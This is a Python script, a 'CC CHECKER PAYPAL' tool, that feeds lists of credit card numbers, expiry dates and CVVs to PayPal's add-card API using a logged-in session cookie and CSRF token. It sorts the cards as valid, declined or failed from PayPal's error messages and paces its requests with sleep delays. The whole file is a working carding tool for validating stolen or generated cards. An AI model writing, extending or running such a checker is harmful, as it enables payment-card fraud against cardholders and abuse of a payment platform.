import requests, json, time, colorama, os, assets, warnings

warnings.filterwarnings("ignore")

os.system("cls")
assets.utils.set_window_size(79, 31)
print(
    colorama.Fore.CYAN,
    """\r╔═╗╔═╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗  ╔═╗╔═╗╦ ╦╔═╗╔═╗╦
║  ║    ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝  ╠═╝╠═╣╚╦╝╠═╝╠═╣║  
╚═╝╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═  ╩  ╩ ╩ ╩ ╩  ╩ ╩╩═╝
""",
)

with open("config.json", "r+") as f:
    data = json.loads(f.read())

print(
    colorama.Fore.GREEN,
    """[OPTIONS]
1] COMBO FORMAT IS ( CCNUMBER|EXPRY_MONTH|EXPRY_YEAR|CVV ) ( NASMOGEN FORMAT )
2] COMBO FORMAT IS ( CCNUMBER [REQUIRES AGED ACCOUNT PAYPAL] )""",
)
option_selected = assets.utils.input("[OPTION] :", "int")

if data.get("paypal_cookie") is None or len(data.get("paypal_cookie")) < 10:
    print(colorama.Fore.RED, "PaypalCookie Invalid Or Missing")
    exit(0)
if data.get("csrf_token") is None:
    print(colorama.Fore.RED, "CsrfToken Invalid Or Missing")
    exit(0)
elif len(data.get("csrf_token")) < 3:
    print(colorama.Fore.RED, "CsrfToken Invalid Or Missing")
    exit(0)
if data.get("billing_address_id") is None:
    print(colorama.Fore.RED, "BillingAddressId Invalid Or Missing")
    exit(0)
elif len(data.get("billing_address_id")) < 3:
    print(colorama.Fore.RED, "BillingAddressId Invalid Or Missing")
    exit(0)
if data.get("productClass") is None:
    print(colorama.Fore.RED, "productClass Invalid Or Missing")
    exit(0)
elif len(data.get("productClass")) < 3:
    print(colorama.Fore.RED, "productClass Invalid Or Missing")
    exit(0)
if data.get("brand") is None:
    print(colorama.Fore.RED, "brand Invalid Or Missing")
    exit(0)
elif len(data.get("brand")) < 3:
    print(colorama.Fore.RED, "brand Invalid Or Missing")
    exit(0)
if option_selected == 2:
    if data.get("expDate") is None:
        print(colorama.Fore.RED, "expDate Invalid Or Missing")
        exit(0)
    elif len(data.get("expDate")) < 3:
        print(colorama.Fore.RED, "expDate Invalid Or Missing")
        exit(0)
    if data.get("verificationCode") is None:
        print(colorama.Fore.RED, "verificationCode Invalid Or Missing")
        exit(0)

    elif len(data.get("verificationCode")) < 3:
        print(colorama.Fore.RED, "verificationCode Invalid Or Missing")
        exit(0)
if option_selected == 2:
    print(
        colorama.Fore.CYAN,
        """
    LOADED CONFIG:
    [CARD TYPES]: {}
    [CARD BRAND]: {}
    [CARD EXPRY]: {}
    [CARD CVV]: {}
    """.format(
            data.get("productClass"),
            data.get("brand"),
            data.get("expDate"),
            data.get("verificationCode"),
        ),
    )
else:
    print(
        colorama.Fore.CYAN,
        """
    LOADED CONFIG:
    [CARD TYPES]: {}
    [CARD BRAND]: {}
    """.format(
            data.get("productClass"), data.get("brand")
        ),
    )

headers = {
    "accept": "application/json",
    "accept-encoding": "gzip, deflate",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,da;q=0.7",
    "cache-control": "no-cache",
    "content-length": "236",
    "content-type": "application/json",
    "cookie": f'{data.get("paypal_cookie")}',
    "origin": "https://www.paypal.com",
    "pragma": "no-cache",
    "referer": "https://www.paypal.com/myaccount/money/cards/new/manual",
    "sec-ch-ua": '"Chromium";v="104",  "Not A;Brand";v="99", "Google Chrome";v="104"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "Windows",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
}

LINES = []

with open("combo.txt", "r+", encoding="utf-8") as f:
    for line in f:
        line = line.strip()
        if len(line) > 5:
            LINES.append(line)


print(colorama.Fore.GREEN, "", end="")

try:
    data = {
        "isValid": True,
        "isFlow": True,
        "productClass": f'{data.get("productClass")}',
        "brand": f'{data.get("brand")}',
        "cardNumber": "0000000000000000",
        "expDate": f'{data.get("expDate")}',
        "verificationCode": f'{data.get("verificationCode")}',
        "billingAddressId": f'{data.get("billing_address_id")}',
        "resubmit": False,
        "_csrf": f'{data.get("csrf_token")}',
    }
    response = requests.post(
        url="https://www.paypal.com/myaccount/money/api/cards/",
        data=json.dumps(data),
        headers=headers,
        verify=False,
        timeout=30,
    )
    response_json = response.json()
except:
    print(colorama.Fore.RED, "", end="")
    input("[ERROR] | CONFIG IS OUTDATED PLEASE UPDATE THE INFORMATION [ENTER TO EXIT]")
    exit(0)

input("[READY] [ENTER TO START] :")

os.system("cls")
assets.utils.set_window_size(79, 31)
print(
    colorama.Fore.CYAN,
    """\r╔╦╗╔═╗╔╦╗╔═╗╔╗╔  ╔═╗╔═╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗  ╔═╗╔═╗╦ ╦╔═╗╔═╗╦
 ║║║╣ ║║║║ ║║║║  ║  ║    ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝  ╠═╝╠═╣╚╦╝╠═╝╠═╣║  
═╩╝╚═╝╩ ╩╚═╝╝╚╝  ╚═╝╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═  ╩  ╩ ╩ ╩ ╩  ╩ ╩╩═╝
""",
)
for line in LINES:
    line = line.strip()
    try:
        if option_selected == 2:
            data = {
                "isValid": True,
                "isFlow": True,
                "productClass": f'{data.get("productClass")}',
                "brand": f'{data.get("brand")}',
                "cardNumber": f"{line}",
                "expDate": f'{data.get("expDate")}',
                "verificationCode": f'{data.get("verificationCode")}',
                "billingAddressId": f'{data.get("billing_address_id")}',
                "resubmit": False,
                "_csrf": f'{data.get("csrf_token")}',
            }
        elif len(line.split("|")) == 4:
            cc_num, expry_month, expry_year, cvv = line.split("|")
            data = {
                "isValid": True,
                "isFlow": True,
                "productClass": f'{data.get("productClass")}',
                "brand": f'{data.get("brand")}',
                "cardNumber": f"{cc_num}",
                "expDate": f"{expry_month}/{expry_year[2]}{expry_year[3]}",
                "verificationCode": f"{cvv}",
                "billingAddressId": f'{data.get("billing_address_id")}',
                "resubmit": False,
                "_csrf": f'{data.get("csrf_token")}',
            }
        else:
            continue
        response = requests.post(
            url="https://www.paypal.com/myaccount/money/api/cards/",
            data=json.dumps(data),
            headers=headers,
            verify=False,
            timeout=30,
        )
        response_json = response.json()
        if (
            response_json["error"] != None
            and (
                response_json["error"]["message"]
                == "Invalid security code. Please check the information and try again."
            )
            or response_json["error"] is None
        ):
            print(colorama.Fore.GREEN, f"Valid | {line}")
            with open("results.txt", "a+") as f:
                f.write(f"{line}\n")
            time.sleep(60)
        elif (
            response_json["error"]["message"]
            == "Your card was declined by the issuing bank. Please try a different card or contact your card issuer with questions."
        ):
            print(colorama.Fore.RED, f"Declined | {line}")
            with open("declined.txt", "a+") as f:
                f.write(f"{line}\n")
            time.sleep(30)
            continue
        else:
            print(colorama.Fore.RED, f"Failed | {line}")
            with open("failed.txt", "a+") as f:
                f.write(f"{line}\n")
            time.sleep(30)
            continue
    except Exception as e:
        with open("errorlog.txt", "a+") as f:
            f.write(f"{line}\n")
        print(colorama.Fore.RED, f"ERROR | {str(e)}")
    time.sleep(30)
open("combo.txt", "w+").close()
print(colorama.Fore.GREEN, "", end="")
input("[DONE] [ENTER TO EXIT] :")
